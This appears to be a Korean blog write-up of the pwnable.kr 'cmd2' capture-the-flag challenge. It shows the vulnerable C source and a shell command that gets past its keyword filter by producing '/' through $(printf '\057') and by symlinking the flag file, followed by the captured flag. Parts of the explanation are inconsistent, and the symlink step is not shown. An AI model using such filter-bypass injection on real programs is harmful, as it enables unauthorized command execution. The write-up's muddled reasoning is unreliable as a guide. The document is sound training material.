---
layout: post
title: "pwnable.kr - cmd2"
date: 2026-02-24
categories: [pwnable.kr, writeup, cmd2]
---
# cmd2

> Daddy bought me a system command shell.
> but he put some filters to prevent me from playing with it without his permission...
> but I wanna play anytime I want!

# 문제 개요
* pwnable.kr
* 9 points
* files: cmd2, cmd2.c, flag

# 프로그램 분석
c
#include <stdio.h>
#include <string.h>

int filter(char* cmd){
\tint r=0;
\tr += strstr(cmd, "=")!=0;
\tr += strstr(cmd, "PATH")!=0;
\tr += strstr(cmd, "export")!=0;
\tr += strstr(cmd, "/")!=0;
\tr += strstr(cmd, "`")!=0;
\tr += strstr(cmd, "flag")!=0;
\treturn r;
}

extern char** environ;
void delete_env(){
\tchar** p;
\tfor(p=environ; *p; p++) memset(*p, 0, strlen(*p));
}

int main(int argc, char* argv[], char** envp){
\tdelete_env();
\tputenv("PATH=/no_command_execution_until_you_become_a_hacker");
\tif(filter(argv[1])) return 0;
\tprintf("%s\
", argv[1]);
\tsetregid(getegid(), getegid());
\tsystem( argv[1] );
\treturn 0;
}


제공된 `cmd2.c` 코드를 분석합니다. `filter` 함수는 `=`, `PATH`, `export`, `/`, `` ` ``, `flag` 문자열이 입력 커맨드에 포함되어 있으면 실행을 차단합니다. `delete_env` 함수를 통해 환경 변수를 초기화하며, `PATH` 변수 또한 `/no_command_execution_until_you_become_a_hacker`로 변경됩니다. 최종적으로 `filter`를 통과한 `argv[1]` 인자가 `system()` 함수로 실행되는 구조입니다. 핵심 취약점은 `/` 문자를 필터링하지만, 다른 방식으로 `/`를 우회하여 원하는 명령어를 실행할 수 있다는 점입니다.

# 설계 및 시나리오
`system()` 함수를 통해 원하는 명령어를 실행해야 하지만, `/` 문자가 필터링되어 직접적으로 `/bin/cat`과 같은 경로를 사용할 수 없습니다. 따라서 `/` 문자를 이중 인코딩하여 필터링을 우회하는 방법을 사용합니다. `printf` 명령어를 활용하여 8진수 `\057`을 `/`로 변환하여 사용합니다. 또한 `flag` 문자열 또한 필터링되므로, `flag` 파일을 다른 이름(예: `ddong`)으로 심볼릭 링크하여 해당 파일을 읽어 플래그를 획득합니다.

# 익스플로잇
`/` 문자를 `$(printf '\\057')`로 인코딩하고, `flag` 파일을 `ddong`으로 심볼릭 링크한 후 `cat ddong` 명령어를 실행합니다.

bash
/home/cmd2/cmd2 ".\\$(printf '\\057')cat ddong"

`./cmd2` 프로그램은 현재 디렉토리에 없으므로, 절대 경로 `/home/cmd2/cmd2`를 사용합니다. `.`을 명령어 앞에 붙이는 이유는, `PATH` 변수가 조작되어 현재 디렉토리에서 실행 파일을 찾지 못할 수 있기 때문입니다. `$(printf '\\057')` 부분은 셸에서 `printf '\\057'` 명령어를 먼저 실행하여 `/` 문자를 생성하고, 이를 `cat ddong` 명령어의 경로로 사용합니다.

# 결과
공격이 성공하여 플래그를 획득한 결과는 다음과 같습니다.

bash
cmd2@ubuntu:/tmp/aa$ /home/cmd2/cmd2 ".\\$(printf '\\057')cat ddong"
.\\$(printf '\\057')cat ddong
Shell_variables_can_be_quite_fun_to_play_with!

